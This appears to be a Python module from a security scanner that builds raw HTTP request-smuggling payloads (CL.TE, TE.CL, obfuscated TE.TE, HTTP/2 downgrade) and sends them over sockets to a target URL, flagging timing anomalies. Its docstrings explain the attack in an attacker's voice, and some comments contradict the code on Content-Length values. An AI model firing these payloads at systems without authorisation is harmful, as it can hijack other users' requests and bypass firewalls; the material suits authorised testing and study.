"""HTTP request-smuggling probe builder + timing detector.

Smuggling primer
----------------
HTTP/1.1 defines two ways to delimit a request body:
  - Content-Length: N  (exactly N bytes)
  - Transfer-Encoding: chunked  (chunked framing ending in "0\\r\\n\\r\\n")

When both headers are present, RFC 7230 §3.3.3 says TE wins. But in
practice, many proxy/origin pairs disagree. We abuse the disagreement.

CL.TE attack
------------
Front-end (edge) honors Content-Length: N, reads N bytes.
Back-end (origin) honors Transfer-Encoding, stops at "0\\r\\n\\r\\n".

Crafted request (simplified):

    POST / HTTP/1.1
    Host: vuln.example
    Content-Length: 13
    Transfer-Encoding: chunked

    0

    SMUGGLED_RQ_HERE

Edge reads 13 bytes and forwards "0\\r\\n\\r\\nSMUGGLED_RQ_HERE" as one
request; origin parses the "0\\r\\n\\r\\n" as end-of-chunk, then treats
"SMUGGLED_RQ_HERE" as the START of the NEXT request on the
back-end connection. Next innocent victim on that connection
receives our smuggled prefix. No WAF ever scans it.

Detection via timing
--------------------
Send CL.TE with Content-Length too LARGE — edge reads correctly,
origin hangs waiting for the bytes it thinks are still coming.
Response times out or is slow. That slowness with an otherwise
innocent request is a CL.TE signal.

Compact summary of primitives we build:
  - CL.TE timing probe   (edge-trusts-CL, origin-hangs-on-TE)
  - TE.CL timing probe   (edge-trusts-TE, origin-hangs-on-CL)
  - TE.TE obfuscation    (transfer-encoding variant the origin ignores)
  - HTTP/2 downgrade     (h2 :content-length with mismatched body)

Per-request output is a raw `SmuggleProbe` ready to fire over a
plain socket (urllib normalizes too aggressively).
"""

from __future__ import annotations

import logging
import socket
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional

logger = logging.getLogger("amoskys.argos.smuggle")


# ── Data model ────────────────────────────────────────────────────


class SmuggleTechnique:
    CL_TE = "cl.te"
    TE_CL = "te.cl"
    TE_TE = "te.te"
    H2_CL = "h2.cl"


@dataclass
class SmuggleProbe:
    technique: str  # SmuggleTechnique.*
    host: str
    port: int
    use_tls: bool
    raw_bytes: bytes  # exact wire-level payload
    notes: str = ""

    def to_dict(self):
        return {
            "technique": self.technique,
            "host": self.host,
            "port": self.port,
            "use_tls": self.use_tls,
            "raw_bytes_len": len(self.raw_bytes),
            "notes": self.notes,
        }


@dataclass
class SmuggleReport:
    target_url: str
    baseline_latency_ms: int = 0
    results: List[Dict] = field(
        default_factory=list
    )  # [{technique, vulnerable, latency_ms, notes}]
    evidence: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    @property
    def vulnerable(self) -> bool:
        return any(r.get("vulnerable") for r in self.results)

    def to_dict(self):
        return {
            "target_url": self.target_url,
            "baseline_latency_ms": self.baseline_latency_ms,
            "results": list(self.results),
            "evidence": list(self.evidence),
            "errors": list(self.errors),
            "vulnerable": self.vulnerable,
        }


# ── Probe builders ────────────────────────────────────────────────


def _base_host_port(target_url: str) -> (str, int, bool):
    p = urllib.parse.urlparse(target_url)
    host = p.hostname or ""
    use_tls = p.scheme == "https"
    port = p.port or (443 if use_tls else 80)
    return host, port, use_tls


def build_cl_te_probe(target_url: str, smuggled_path: str = "/") -> SmuggleProbe:
    """CL.TE: front-end honors CL, back-end honors TE.

    CL says body is LARGER than the chunked "0\\r\\n\\r\\n" terminator,
    so the origin (TE-trusting) finishes early and returns fast;
    but if the origin also trusts CL and waits for more bytes we'll
    see hangs or 408. A timing divergence between baseline and
    probe signals disagreement at the layer we care about.
    """
    host, port, tls = _base_host_port(target_url)
    smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    body = f"0\r\n\r\n{smuggled}"
    # CL deliberately too small so origin (TE parser) stops after 0-chunk
    # and "GET /" lands as the next request on the back-end connection.
    cl = 4  # "0\r\n\r\n"  edge forwards just the first 4 bytes? — use 5 for safety
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode("utf-8")
    return SmuggleProbe(
        technique=SmuggleTechnique.CL_TE,
        host=host,
        port=port,
        use_tls=tls,
        raw_bytes=raw,
        notes="CL.TE — edge trusts CL, origin trusts TE. Origin sees smuggled GET as next request.",
    )


def build_te_cl_probe(target_url: str, smuggled_path: str = "/") -> SmuggleProbe:
    """TE.CL: front-end honors TE (parses chunked), back-end honors CL.

    We prepend an oversized chunk that passes the edge (TE-parser
    agrees body ends on the final 0-chunk), but the origin
    (CL-trusting) reads exactly the next N bytes and leaves the
    rest queued for the NEXT request.
    """
    host, port, tls = _base_host_port(target_url)
    smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    # Chunk pattern: "%X\r\n%s\r\n0\r\n\r\n"
    inner = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 50\r\n\r\n{smuggled}"
    chunk_size_hex = f"{len(inner):x}"
    body = f"{chunk_size_hex}\r\n{inner}\r\n0\r\n\r\n"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"  # edge will ignore; origin uses
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode("utf-8")
    return SmuggleProbe(
        technique=SmuggleTechnique.TE_CL,
        host=host,
        port=port,
        use_tls=tls,
        raw_bytes=raw,
        notes="TE.CL — edge parses chunked, origin reads CL bytes; smuggled request left on the socket.",
    )


def build_te_te_probe(
    target_url: str,
    smuggled_path: str = "/",
    te_obfuscation: str = "Transfer-Encoding : chunked",
) -> SmuggleProbe:
    """TE.TE: both layers parse TE, but one is fooled into ignoring it
    by an obfuscated header, falling back to CL.

    Common obfuscations (from James Kettle's research):
        "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x"
        "Transfer-Encoding : chunked"    (space before colon)
        "Transfer-Encoding:\\tchunked"
        "transfer-encoding: chunked"     (case variant)
        "Transfer-Encoding: xchunked"
    """
    host, port, tls = _base_host_port(target_url)
    smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    body = f"0\r\n\r\n{smuggled}"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"{te_obfuscation}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode("utf-8")
    return SmuggleProbe(
        technique=SmuggleTechnique.TE_TE,
        host=host,
        port=port,
        use_tls=tls,
        raw_bytes=raw,
        notes=f"TE.TE — one layer misparses '{te_obfuscation}' and falls back to CL.",
    )


def build_h2_downgrade_probe(target_url: str, smuggled_path: str = "/") -> SmuggleProbe:
    """HTTP/2 → HTTP/1.1 downgrade smuggling.

    Many reverse proxies speak HTTP/2 to the client and HTTP/1.1 to
    the origin. If the proxy doesn't strip/normalize hop-by-hop
    headers, we can inject `Content-Length:` into a
    request-pseudo-header slot; the downgrade layer converts it to
    h1 with our desired CL, and the origin re-parses the body.

    Since we don't have an h2 socket library here (would require
    `h2` package), this builder returns the h1-equivalent payload
    the downgrade would produce — suitable for direct injection
    against the origin as a bare-h1 probe, or for documentation
    when the operator shells to curl --http2.
    """
    host, port, tls = _base_host_port(target_url)
    smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    body = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 0\r\n"  # h2 pseudo-header CL override
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode("utf-8")
    return SmuggleProbe(
        technique=SmuggleTechnique.H2_CL,
        host=host,
        port=port,
        use_tls=tls,
        raw_bytes=raw,
        notes="H2.CL — simulates h2→h1 downgrade where CL pseudo-header smuggled through proxy.",
    )


# ── Timing detector ───────────────────────────────────────────────


def _raw_send(
    probe: SmuggleProbe, timeout: float, sender: Optional[Callable] = None
) -> Dict:
    """Send raw bytes, measure first-byte latency.

    `sender(host, port, use_tls, raw_bytes, timeout) -> (status, elapsed_ms, note)`
    is injectable for tests.
    """
    if sender is not None:
        status, elapsed_ms, note = sender(
            probe.host, probe.port, probe.use_tls, probe.raw_bytes, timeout
        )
        return {"status": status, "elapsed_ms": elapsed_ms, "note": note}

    t0 = time.time()
    status = 0
    note = ""
    try:
        sock = socket.create_connection((probe.host, probe.port), timeout=timeout)
        try:
            if probe.use_tls:
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=probe.host)
            sock.sendall(probe.raw_bytes)
            # Read first 4KB or until timeout
            sock.settimeout(timeout)
            data = b""
            try:
                while len(data) < 4096:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if b"\r\n\r\n" in data:
                        break
            except socket.timeout:
                note = "read-timeout"
            # Parse status line
            if data:
                try:
                    first = data.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
                    parts = first.split(" ", 2)
                    if len(parts) >= 2 and parts[1].isdigit():
                        status = int(parts[1])
                except Exception:
                    pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
    except socket.timeout:
        note = "connect-timeout"
    except Exception as exc:  # noqa: BLE001
        note = f"{exc.__class__.__name__}:{exc}"

    elapsed_ms = int((time.time() - t0) * 1000)
    return {"status": status, "elapsed_ms": elapsed_ms, "note": note}


def detect_smuggling(
    target_url: str,
    techniques: Optional[List[str]] = None,
    timeout: float = 6.0,
    baseline_samples: int = 3,
    sender: Optional[Callable] = None,
) -> SmuggleReport:
    """Build probes, compare their first-byte latency to a baseline.

    A probe is considered suspicious if:
      - it times out (strong signal — parser disagreed), OR
      - its latency > baseline + 3σ (weaker signal — queue jam)
    """
    techniques = techniques or [
        SmuggleTechnique.CL_TE,
        SmuggleTechnique.TE_CL,
        SmuggleTechnique.TE_TE,
        SmuggleTechnique.H2_CL,
    ]
    report = SmuggleReport(target_url=target_url)

    # Baseline: plain OPTIONS, averaged
    host, port, tls = _base_host_port(target_url)
    baseline_bytes = (
        f"OPTIONS / HTTP/1.1\r\n" f"Host: {host}\r\n" f"Connection: close\r\n\r\n"
    ).encode("utf-8")
    baseline_probe = SmuggleProbe(
        technique="baseline",
        host=host,
        port=port,
        use_tls=tls,
        raw_bytes=baseline_bytes,
        notes="OPTIONS latency baseline",
    )
    samples = []
    for _ in range(max(1, baseline_samples)):
        r = _raw_send(baseline_probe, timeout, sender=sender)
        samples.append(r["elapsed_ms"])
    mean = sum(samples) / len(samples)
    if len(samples) > 1:
        var = sum((s - mean) ** 2 for s in samples) / (len(samples) - 1)
        stdev = var**0.5
    else:
        stdev = max(mean * 0.2, 50)
    report.baseline_latency_ms = int(mean)
    report.evidence.append(
        f"baseline n={len(samples)} mean={int(mean)}ms stdev={int(stdev)}ms"
    )

    # Map technique → builder
    builders = {
        SmuggleTechnique.CL_TE: build_cl_te_probe,
        SmuggleTechnique.TE_CL: build_te_cl_probe,
        SmuggleTechnique.TE_TE: build_te_te_probe,
        SmuggleTechnique.H2_CL: build_h2_downgrade_probe,
    }

    # 3σ rule (with a floor for tiny stdev on fast sites)
    threshold = mean + max(3 * stdev, 500)

    for t in techniques:
        build = builders.get(t)
        if not build:
            report.errors.append(f"unknown technique: {t}")
            continue
        try:
            probe = build(target_url)
        except Exception as exc:  # noqa: BLE001
            report.errors.append(f"{t} build error: {exc}")
            continue
        res = _raw_send(probe, timeout, sender=sender)
        suspicious = res["elapsed_ms"] > threshold or "timeout" in (
            res.get("note") or ""
        )
        report.results.append(
            {
                "technique": t,
                "vulnerable": suspicious,
                "latency_ms": res["elapsed_ms"],
                "status": res["status"],
                "note": res.get("note", ""),
                "threshold_ms": int(threshold),
            }
        )
        report.evidence.append(
            f"{t}: latency={res['elapsed_ms']}ms status={res['status']} note={res.get('note','')} "
            f"{'SUSPICIOUS' if suspicious else 'clean'}"
        )

    return report


__all__ = [
    "SmuggleProbe",
    "SmuggleReport",
    "SmuggleTechnique",
    "build_cl_te_probe",
    "build_te_cl_probe",
    "build_te_te_probe",
    "build_h2_downgrade_probe",
    "detect_smuggling",
]
